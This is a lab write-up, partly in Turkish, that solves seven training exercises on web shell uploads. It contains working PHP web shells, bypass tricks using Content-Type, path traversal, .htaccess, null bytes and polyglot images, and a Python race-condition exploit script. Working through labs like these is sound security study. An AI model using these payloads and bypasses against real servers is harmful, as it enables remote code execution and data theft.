#### 1.Lab: Remote code execution via web shell upload

First we log in to our account through the info already disclosed to us in the lab info, after that we upload a random image to check how the image is posted and how the image is fetched
the image is fetched through the files/avatars/yourimage.jpg path. 
we then upload a php file that birngs forth Carlos'secret
the php file has the expression below written on it
expression: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
after that we send a get request that is forged thanks to the burp repeater.
we change the filepath to files/avatars/yourphpfile.php
The response of the request we send has the secret which is: VLe1wkWcp4QRBOfepfAT0tZL9ed86zT4


#### 2.Lab: Web shell upload via Content-Type restriction bypass

For this lab we do the same thing as the previous lab, but there is a catch. There is a cretain file type that our file has to adhere to in order for us to be able to upload it. But this file type can be easily changed via burp repeater we firstly choose the php file then send it, because it is intercepted we can change the content type to image/jpeg with this we face no problem uploading the data. When we send a get request with the file path /files/avatars/exploit.php we get the secret which is:

RHMViRwjDrhbPfJTLv3zMwY8HpIu1zgt

#### 3.Lab: Web shell upload via path traversal

File upload ettiğimizde avatar directorysinin altında php dosyamız çalışmıyor, biz de bundan dolayı path traversal ile files dosyasının altına gireceğiz dosyamızı. Bunu da interceptlediğimiz bir post requestinde filename kısmına ..%2fexploit.php yazarak sağlıyoruz. bunu yaptıktan sonra dosyamızı çağırdığımızda php çalışacak ve şifreyi elde edeceğiz.
qp8RYs784s2t4Hgt6nUX1keuYIfH8jam

#### 4.Lab: Web shell upload via extension blacklist bypass

The lab tells us that php files are blacklisted, so we need to find a way to upload our php file another way. When we send our php file we learn that the application uses an Apache Server. In this apache server we need to send a .htaccess file which can change the configuration of a specific folder, changes apply to all subdirectories. 

Note: apache documentation and how to write htaccess files

in our htaccess file we write

AddType application/x-httpd-php .naber
also dont forget to change the content-type to text/plain and the filename to .htaccess

this allows us to run files with .naber extension as php files

after this load the exploit.naber file that has `<?php echo file_get_contents('/home/carlos/secret'); ?>` written in it after and this shows us the password which is : AzVv4r0EvanWGcgS6k8UVuJ5vm9uEP6S

#### # 5.Lab: Web shell upload via obfuscated file extension

Note: learn more about obfuscation techniques.

Bu labda obfuscation yapmamız gerekiyor, bunun için de null byte `%00` ifadesini kullanıyoruz
upoad ederken filename kısmına `<?php echo file_get_contents('/home/carlos/secret'); ?>` ifadesini içeren exploit.php%00.png ifadesini yazıyoruz. response olarak bize  'The file avatars/exploit.php has been uploaded.' yazısını dönüyor bu da dosyayı başarılı olarak yüklediğimiz anlamına geliyor. 
ardından `GET /files/avatars/exploit.php HTTP/2` isteğini gönderiyoruz bu sayede de şifreyi elde etmiş oluyoruz. Şifremiz ise: ObEjDSJZ7AehPAbcagbSlPMSYz1V6Uag

#### 6.Lab: Remote code execution via polyglot web shell upload

Note: Learn more php

Bu labda uygulama yüklenen dosyanın fotoğraf olup olmadığını inceliyor, stegano ile bir dosya oluşturmayı denedim ama olmadı. Labda polyglot bir php dosyası oluşturmamız gerekiyormuş. Bunu da `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php` komutu ile gerçekleştiriyoruz bu dosyayı yükleldikten sonra get isteğiyle çekince response kısmında START ve END ifadeleri arasında aradığımız bilgiyi buluyoruz.

v6DAaQcUaY9Ic82effocZlyQnjisp9OU

#### 7.Lab: Web shell upload via race condition

Race Condition: A **race condition** occurs when multiple processes or threads access shared resources concurrently and the outcome depends on the order of execution. This can lead to unintended behavior, especially in **file handling, security checks, and database transactions**.

Note: requests, threading çalış

Bu labda race condition durumundan yararlanarak `<?php echo file_get_contents('/home/carlos/secret'); ?>` php payloadını çalıştırmaya çalışacağız. Uygulamaya jpg ve png dışında bir yükleme yapılamammaktadır. Bir dosya yüklenirken uygulama şöyle bir prosedür izlemektedir: geçici olarak dosya yükle, virüs check yap, veri tipi kontrol et jpg veya png değilse sil. Biz de burda kontrol ve geçici yükleme sırasında oluşan race condition'dan yararlanıyoruz. bunun için bir python kodu kullanıyoruz.

Python kodu:
```
import requests
import threading
import time

# Target URLs

UPLOAD_URL = "https://0a150080036d26e481ad7a9600ef00ea.web-security-academy.net/my-account/avatar"

EXPLOIT_URL = "https://0a150080036d26e481ad7a9600ef00ea.web-security-academy.net/files/avatars/exploit.php"

# Cookie for authentication

COOKIES = {"session": "uL2ncVAhqY4zgfUupgfCA8SEMf0PNuWr"}

# Headers for GET request

HEADERS = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
}

  

# File Data for POST Request
FILES = {
    "avatar": ("exploit.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>", "application/octet-stream"),
    "user": (None, "wiener"),
    "csrf": (None, "TtAWvP1FTiKuPwEVQha4iRYgPi1Pi2NI"),
}

# Function to upload the file

def upload_exploit():
    response = requests.post(UPLOAD_URL, cookies=COOKIES, files=FILES)
    print("[+] Uploaded exploit.php:", response.status_code)

# Function to request the exploit file

def request_exploit():
    while True:
        response = requests.get(EXPLOIT_URL, cookies=COOKIES, headers=HEADERS)
        if response.status_code == 200:
            print("[SUCCESS] Exploit executed!")
            print(response.text)
            break
        time.sleep(0.05)  # Short delay to retry

# Launching race condition
if __name__ == "__main__":
    # Create threads for multiple GET requests
    get_threads = [threading.Thread(target=request_exploit) for _ in range(5)]
    # Start GET request threads before uploading
    for t in get_threads:
        t.start()
    # Upload exploit file
    upload_exploit()
    # Wait for GET request threads to finish
    for t in get_threads:
        t.join()
```

Şifre: FT46BAmlxvGkHMgSylHbfFcDrq7KIGxF